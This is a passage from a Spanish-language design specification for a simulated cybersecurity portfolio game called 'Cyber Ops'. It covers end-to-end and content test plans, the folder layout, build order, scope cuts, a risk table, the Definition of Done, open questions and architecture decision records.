  acciones en orden.
- Cada pantalla de misión renderiza la etiqueta "Datos simulados".
- Si 11 adopta axe, una verificación por pantalla (hub, cada misión en su estado inicial, cada debrief).

### 15.3 Playwright (un recorrido)

`tests/e2e/cyber-ops.spec.ts`, Chromium escritorio:

1. Abrir `/es/cyber-ops/?seed=2a`, elegir "Sin límite de tiempo".
2. M01: el test importa el motor y el contenido (TS puro) para calcular la secuencia de esa semilla
   y responde correctamente las 24 peticiones solo con teclado.
3. M02: responde los tres casos con la rúbrica correcta.
4. M03: ejecuta el camino de referencia y declara resuelto.
5. Verifica el cierre y que el CTA navega a `/es/security/`.
6. Recarga `/es/cyber-ops/`: las tres misiones aparecen completadas.

Un humo de tiempo real (iniciar, pulsar `1`, pausar con `P`, verificar el estado de pausa) puede
vivir en el mismo archivo. Sin capturas visuales en V1.

### 15.4 Contenido (Vitest)

- Todo `L10n` tiene `es` y `en` no vacíos y distintos (salvo términos marcados como iguales en ambos
  idiomas).
- Ids únicos por colección; `danger` es subcadena de `text`; cada `AttackKind` tiene `fix` y `ref`.
- Tamaños mínimos de las bolsas de M01 (§6.11).
- Toda IP del contenido está en `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24` o `10.0.0.0/8`;
  todo dominio termina en `.example`, `.test` o `.invalid`.
- Ningún texto contiene "Wazuh" fuera de las claves de texto puente aprobadas (lista blanca).
- Todo `ExitLink.route` existe en el registro de rutas.

### 15.5 Arquitectura

- ESLint `no-restricted-imports`: `engine/` y `content/` no importan `react`, `react-dom` ni `view/`;
  nada fuera de `src/game/` importa `src/game/**` salvo el módulo de ruta y `entry.ts`.
- `tsc --noEmit` en CI (ya existe el script `typecheck`).

---

## 16. Estructura de carpetas

```text
Frontend/src/game/
  entry.ts                      metadatos para Home y rutas (sin código de juego)
  links.ts                      salidas al portafolio (ExitLink por misión y cierre)
  game.module.css               estilos compartidos (CSS Modules, D1)
  core/
    types.ts                    Locale, L10n, MissionId, Mode, Tier, Step, Engine, MissionResult
    rng.ts  rng.test.ts
    progress.ts  progress.test.ts
    invariant.ts
  platform/
    loop.ts                     bucle rAF de paso fijo (M01)
    storage.ts                  adaptador localStorage + memoria
    seed.ts                     ?seed= o crypto
    usePauseTriggers.ts         visibilidad, fuera de vista, blur
    useLocale.ts                puente con el i18n del sitio (05)
  i18n/
    strings.ts                  textos de interfaz como L10n
  shell/
    CyberOpsHub.tsx
    MissionRoute.tsx            briefing → partida → debrief, ErrorBoundary
    Ending.tsx
    ModeSelect.tsx
    SimulatedBadge.tsx
    LiveRegion.tsx
    ExitLinks.tsx
  missions/
    firewall/
      types.ts  params.ts  engine.ts  engine.test.ts  store.ts
      content/attacks.ts  content/payloads.ts  content/content.test.ts
      view/FirewallMission.tsx  FirewallHud.tsx  Rack.tsx  Board.tsx  Lane.tsx
           Packet.tsx  Inspector.tsx  PauseOverlay.tsx  UntimedRound.tsx  FirewallDebrief.tsx
      firewall.module.css
    detection/
      types.ts  engine.ts  engine.test.ts  scoring.ts  timeline.ts  rules.ts  rules.test.ts
      content/case-fim.ts  content/case-auth.ts  content/auth-dataset.ts  content/content.test.ts
      view/DetectionMission.tsx  AlertHeader.tsx  ContextPanel.tsx  Timeline.tsx  StepNav.tsx
           IocPicker.tsx  KeyEventPicker.tsx  ClassifyStep.tsx  ResponseStep.tsx
           CaseReview.tsx  RuleTuner.tsx  DetectionDebrief.tsx
      detection.module.css
    recovery/
      types.ts  model.ts  model.test.ts  engine.ts  engine.test.ts  postmortem.ts
      content/scenario-cache-keys.ts  content/content.test.ts
      view/RecoveryMission.tsx  IncidentHeader.tsx  SystemDiagram.tsx  SystemTable.tsx
           InspectPanel.tsx  ErrorChart.tsx  ActionList.tsx  DiagnosisSelect.tsx  Postmortem.tsx
      recovery.module.css
Frontend/tests/e2e/cyber-ops.spec.ts
```

El archivo actual `src/game/payloads.ts` se mueve a `missions/firewall/content/` en la Fase 0, con
los cambios de §6.11. Los módulos de ruta (donde 04 los ubique) son wrappers delgados que hacen
`lazy(() => import('…/game/shell/…'))`.

---

## 17. Orden de construcción, recortes y riesgos

### 17.1 Orden recomendado

1. Core + shell + persistencia + M01 (ya tiene diseño y catálogo). Primer playtest.
2. M03 (no depende de 08; es la misión para el CTO).
3. M02 (depende de la redacción y las anclas de 08).
4. Cierre, enlaces de salida definitivos, revisión de textos y DoD global.

### 17.2 Recortes, en orden (si el calendario de 15 aprieta)

| # | Recorte | Qué se pierde | Queda |
|---|---|---|---|
| 1 | Caso 3 de M02 (ajuste de reglas) → V1.1 | La parte de detection engineering | M02 con dos casos (máx. 200) |
| 2 | Inspector de M01 en escritorio (se mantiene en móvil) | Comodidad de lectura en escritorio | Clic y teclas por carril |
| 3 | Gráfico de errores de M03 | Ver la evolución | La tabla de estado |
| 4 | Reglas de "ayudó/empeoró" del postmortem | Feedback personalizado | Postmortem con contenido fijo y la línea de tiempo |
| 5 | Ampliaciones del catálogo (open redirect, CRLF, XXE) | Variedad | El catálogo actual mejorado |

Fuera de V1 por diseño: leaderboard, modo infinito, sonido, segundo escenario de M03, compartir
resultado con imagen OG, guardar partidas a medias.

### 17.3 Riesgos

| Riesgo | Probabilidad | Impacto | Mitigación |
|---|---|---|---|
| El juego consume el tiempo del resto del portafolio | Alta | Alto | Límite de esfuerzo en 15; orden de §17.1; recortes predefinidos |
| Se percibe como gimmick por la audiencia de seguridad | Media | Alto | Diseño sobrio (sin tópicos hacker), exactitud verificada, opcional, salidas a lo real |
| Un error técnico en el contenido (payload, evento de Windows, fórmula) daña la credibilidad más que no tener juego | Media | Alto | Campo `ref` por dato, verificación contra fuente, revisión de César y de una segunda persona técnica |
| Se lee como integración con Wazuh | Baja | Alto | Etiqueta permanente, texto puente, test de "Wazuh" con lista blanca |
| Tiempo real injugable en móvil de gama baja | Media | Medio | Paso fijo, posiciones fuera de React, perfil con CPU 4×; modo sin límite como alternativa |
| Dificultad mal calibrada | Alta | Medio | Parámetros en tablas de datos, criterio de playtest en el DoD |
| Deriva entre ES y EN | Media | Medio | `L10n` obligatorio por tipo; revisión de ambos idiomas en el DoD |
| Enlaces de salida a casos no confirmados | Media | Medio | Ids de ruta + test; candidatos sin confirmar no se publican |
| Mantener tres motores | Baja | Medio | Contrato común (§4.2), sin dependencias, tests deterministas |

---

## 18. Definition of Done global

- [ ] DoD de las tres misiones (§6.14, §7.13, §8.11) cumplidos.
- [ ] Hub, cierre y persistencia funcionando, también sin `localStorage`.
- [ ] Recorrido de Playwright en verde en CI.
- [ ] Presupuestos de §14 verificados y registrados como MEDIDO (herramienta, fecha, método).
- [ ] 0 bytes del juego en el chunk de Home.
- [ ] Revisión de honestidad: etiqueta de simulado en cada pantalla; ningún texto insinúa
      integración real; el texto puente de M02 coincide con 08; IPs y dominios reservados (test).
- [ ] Recorrido completo solo con teclado y con NVDA o VoiceOver.
- [ ] Las entradas desde Home y Security Lab y las salidas a Security Lab y casos de estudio
      resuelven a rutas existentes.
- [ ] ADRs de §20 escritos.
- [ ] César aprobó los textos ES y EN de las tres misiones y del cierre.

---

## 19. Preguntas abiertas para César

| # | Pregunta | Recomendación |
|---|---|---|
| Q1 | ¿Integridad 5 en lugar de 3, ajustable tras playtest? | Sí, 5, con el criterio de §6.14 |
| Q2 | ¿El sistema ficticio usa rutas y logs en inglés (G11)? El catálogo actual está en español | Sí: el payload es código y no se duplica |
| Q3 | ¿El caso 1 de M02 usa nombres reales del laboratorio (la ruta monitoreada; nunca el nombre del equipo) como homenaje explícito, o ficticios? | Ficticios, con el texto puente enlazando a la prueba real |
| Q4 | Frases finales: ¿"Engineering isn't only…" como titular del cierre y "Systems don't fail…" al cierre del postmortem de M03? | Sí (§3.5) |
| Q5 | ¿Cyber Ops en la navegación primaria o solo en Home, Security Lab y footer? (lo decide 02) | Home, Security Lab y footer |
| Q6 | Resuelta por 07: M03 enlaza a los failure modes de Quantum | — |
| Q7 | ¿Planeas implementar la simulación de fuerza bruta en el laboratorio? Si existe antes del lanzamiento, el texto puente de M02 cambia y enlaza la evidencia real | — |
| Q8 | ¿Cuánto tiempo del roadmap se asigna al juego frente al resto del sitio? | Definirlo en 15 antes de empezar |
| Q9 | El laboratorio menciona Sysmon en `architecture/README.md`, pero `simulations/` dice que no hay monitoreo de procesos. ¿Cuál es correcto? (afecta a 08; el juego no menciona Sysmon) | Corregir el README del laboratorio |
| Q10 | ¿Mostrar la semilla en el debrief y admitir `?seed=` en producción? | Sí: inofensivo y útil para reproducir errores |

---

## 20. ADRs que este documento origina (para 10)

En 10, los puntos 1 y 2 se agrupan en ADR-0009 y el punto 3 es ADR-0012.

1. **Motor de juego puro y determinista con vista React, en DOM y no en Canvas.** Contexto: el juego
   consiste en leer texto y debe ser accesible y testeable. Alternativas: Canvas, librería de juegos,
   lógica en componentes.
2. **Progreso del juego solo en `localStorage`.** Contexto: V1 sin backend. Alternativas: backend
   con leaderboard, sin persistencia. Condición de revisión: si se construye backend (14).
3. **Modo sin límite de tiempo como equivalente accesible del tiempo real.** Contexto: WCAG 2.2.1 y
   lectores de pantalla frente a una mecánica en tiempo real. Alternativas: solo ajustar velocidad,
   excepción de "tiempo esencial".
